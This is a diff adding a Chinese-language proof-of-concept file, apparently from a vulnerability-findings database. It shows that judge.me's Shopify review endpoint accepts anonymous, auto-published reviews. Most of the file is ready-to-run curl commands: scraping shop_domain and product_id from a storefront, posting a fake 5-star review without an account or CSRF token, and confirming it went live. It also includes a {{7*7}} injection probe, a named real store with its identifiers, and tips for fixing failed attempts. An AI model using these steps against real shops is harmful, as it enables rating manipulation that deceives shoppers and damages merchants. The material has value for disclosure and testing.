@@ -1,0 +1,86 @@
+# judge.me 评论提交端点 POST /api/v1/reviews 匿名即自动发布（任意商品刷评/操纵评分，无需账号与 CSRF）
+
+- **code**: judge-me-anonymous-review-submit-autopublish
+- **kind**: poc
+- **category**: unauthorized
+- **component**: judge.me（Shopify 评论 app，api.judge.me / cdn.judge.me）
+- **severity**: low
+- **language**: markdown
+- **source**: self
+- **verified**: 1
+- **verified_note**: task#9 / finding_id=133（finding_checks.verdict=verified，status=confirmed）。2026-11-11 17:14-17:47 UTC 本机 Linux（curl + headless Chromium 157）对 retro-refresh.com：① 商品页 /products/ipod-flash-adapter 暴露 shop_domain=u1s10u-cw.myshopify.com 与 product_id=15692266996044；② 匿名 multipart POST https://api.judge.me/api/v1/reviews（rating=5，body 含 canary）无 401/403/验证码；③ T+30s GET cdn.judge.me/reviews/reviews_for_widget?product_id=15692266996044 → number_of_reviews 3→4、uuid 0d00ec7f-fc04-4a43-8237-8f98d5dab0c0、reviewer_name=i1651、rating=5、verified_buyer=false；④ all_reviews_js_based 的 number_of_product_reviews 8→9；⑤ Chromium 渲染为纯文本，injectedTagHits=[]（无 HTML 注入）。判定成立：任何第三方可对任意商品匿名发布并自动公开评论，影响评分与评论内容完整性。
+- **path**: pocs/judge-me-anonymous-review-submit-autopublish/judge_me_review_anon_submit.md
+- **tags**: judge-me, shopify, review, business-logic, unauth-write, rating-manipulation, autopublish
+- **created_at**: 2026-11-11T17:52:02.335Z
+- **engine**: https://retro-refresh.com（api.judge.me / cdn.judge.me）
+
+## 描述
+
+Shopify 店铺集成的 judge.me 评论提交端点 POST https://api.judge.me/api/v1/reviews 匿名可用：不需要账号/Cookie/CSRF token/验证码/真实邮箱/购买记录，提交后约 30 秒即公开计入商品评分（verified_buyer=false）。可将任意店铺的 shop_domain + product_id 作为参数为任意商品刷好评/差评或塞任意评论文案；评论 HTML 被服务端剥离并按纯文本渲染，影响限于评分与内容完整性操纵，非存储型 XSS。
+
+## 用法
+
+```
+1) 从目标商品页取 shop_domain 与 product_id：curl -sk -A "$UA" https://<storefront>/products/<handle> -o p.html；grep data-product-id 与 shop_domain。
+2) 匿名 multipart 提交：curl -sk -A "$UA" -X POST https://api.judge.me/api/v1/reviews -F url=<shop_domain> -F shop_domain=<shop_domain> -F platform=shopify -F rating=5 -F name=<canary> -F email=<canary>@example.com -F body=<canary body> -F id=<product_id>。
+3) T+30s 回读两个公开 CDN 接口判据：reviews_for_widget?product_id=<product_id>... 的 number_of_reviews 基线+1 且出现自己的 reviewer_name/body_html；all_reviews_js_based?shop_domain=... 的 number_of_product_reviews 基线+1。
+4) 常见失败：字段名写错（product_id 不认，必须 id）、shop_domain 不属于该店、店铺开了审核模式（autopublish 关闭）、刚提交未到 30s 发布延迟。
+```
+
+## 正文
+
+```
+# judge.me 评论端点匿名提交 → 自动发布（评分与评论内容操纵）
+
+## 前置条件
+- 目标为 Shopify 店铺并集成了 judge.me 评论 app；商品页存在 judge.me review widget。
+- 从商品页 HTML 读两样东西：
+  - `shop_domain`：judge.me 配置里的 myshopify 域（形如 `<shop-handle>.myshopify.com`）
+  - `product_id`：widget 提交表单的 `data-product-id` / `id` 字段
+- 不需要账号 / Cookie / CSRF token / 验证码 / 真实邮箱 / 购买记录。
+
+## 步骤 0：从商品页取参数
+```bash
+curl -sk -A "$UA" "https://<storefront>/products/<handle>" -o product.html
+grep -oE 'data-product-id="[0-9]+"' product.html | head
+grep -oE 'shop_domain["'"'"':= ]+[^",}&]+' product.html | head
+```
+
+## 步骤 1：匿名提交评论（multipart）
+```bash
+curl -sk -A "$UA" -X POST 'https://api.judge.me/api/v1/reviews' \
+  -F 'url=<shop-handle>.myshopify.com' \
+  -F 'shop_domain=<shop-handle>.myshopify.com' \
+  -F 'platform=shopify' \
+  -F 'rating=5' \
+  -F 'name=<canary-name>' \
+  -F 'email=<canary>@example.com' \
+  -F 'body=<canary-body> & "dq" '\''sq'\'' {{7*7}}' \
+  -F 'id=<product_id>'
+```
+无 401 / 403 / 验证码 / 错误提示即视为受理（页面等待窗口内可能看不到响应正文，直接进下一步读回）。
+
+## 步骤 2：回读判据（约 30 秒后）
+```bash
+# 商品 widget 数据源
+curl -sk "https://cdn.judge.me/reviews/reviews_for_widget?product_id=<product_id>&page=1&sort_by=created_at&sort_dir=desc&per_page=40&widget_theme=carousel&shop_domain=<shop_domain>&platform=shopify"
+
+# 店铺评论聚合（所有访客可见）
+curl -sk "https://cdn.judge.me/reviews/all_reviews_js_based?shop_domain=<shop_domain>&platform=shopify&page=1&per_page=20&sort_by=created_at&sort_dir=desc"
+```
+命中判据：
+- `reviews` 数组出现自己写入的 `reviewer_name` / `body_html`，且 `verified_buyer=false`；
+- `number_of_reviews` 比提交前基线 +1；聚合页 `number_of_product_reviews` +1；
+- 商品页评分随评论数/星级变化。
+
+## 影响边界
+- 评论 HTML 标签被服务端剥离、`&` 被转义，正文按纯文本渲染（`body_html` 形如 `<p>...</p>`，内部实体已编码）——**不是存储型 XSS**；影响限于评分与评论内容完整性操纵（刷好评/差评、塞任意文案）。
+- 未购买也可发布（`verified_buyer=false`）。
+
+## 失败常见原因
+- `shop_domain` 或 `product_id` 不属于该店铺 → 评论落到别处或永不可见；
+- 提交后立刻查不到 → 发布有约 30s 延迟；
+- 字段名用 `product_id` 代替 `id` → 服务端不认；
+- 目标店铺关闭了 autopublish（审核模式）→ 评论进入待审，不公开；
+- 若 widget 已换成其它评论服务，api.judge.me 仍可提交但对目标店无效。
+```
